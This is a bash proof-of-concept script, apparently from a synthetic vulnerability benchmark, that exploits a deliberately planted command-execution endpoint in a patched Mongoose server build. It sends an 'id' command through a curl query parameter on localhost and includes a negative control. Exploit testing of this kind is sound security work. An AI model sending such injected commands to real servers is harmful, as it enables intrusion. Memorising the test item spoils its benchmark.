#!/usr/bin/env bash
# PoC for 136_mongoose_C2I2S3
# Axes: C2 (config file gate) / I2 (sh -c wrapper) / S3 (strict-exec; bypass: omit --strict-exec)
#
# Usage: ./PoC.sh
# Expected: prints uid= line confirming RCE as the server process user.
#
# The patched binary (mongoose_server) lives in this directory. If it is absent,
# run:  cd $(dirname $0) && bash build.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/mongoose_server"
WWWROOT="/tmp/poc_136_www"
MARKER="/tmp/poc_136_marker"
CONF="/tmp/poc_136.conf"
PORT=18136

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER" "$CONF"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# ── write config file ──────────────────────────────────────────────────────────
cat > "$CONF" <<EOF
exec_mode = 1
exec_logging = 1
EOF

# ── start server (no --strict-exec → S3 bypass) ───────────────────────────────
echo "[*] starting mongoose_server with --config $CONF on port $PORT (no --strict-exec)..."
"$BINARY" --port "$PORT" --root "$WWWROOT" --config "$CONF" &
SERVER_PID=$!
sleep 0.4

# ── trigger ────────────────────────────────────────────────────────────────────
echo "[*] sending payload: cmd=id>$MARKER"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id>${MARKER}" > /dev/null || true

sleep 0.2

# ── verify ─────────────────────────────────────────────────────────────────────
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# ── negative control: no --config means exec_cfg.enabled=0 → 404 ──────────────
echo "[*] verifying gate: endpoint must be absent without --config..."
NEG_PORT=19136
"$BINARY" --port "$NEG_PORT" --root "$WWWROOT" &
NEG_PID=$!
sleep 0.4
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?cmd=id" || echo "000")
kill "$NEG_PID" 2>/dev/null; wait "$NEG_PID" 2>/dev/null || true
if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 without --config"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
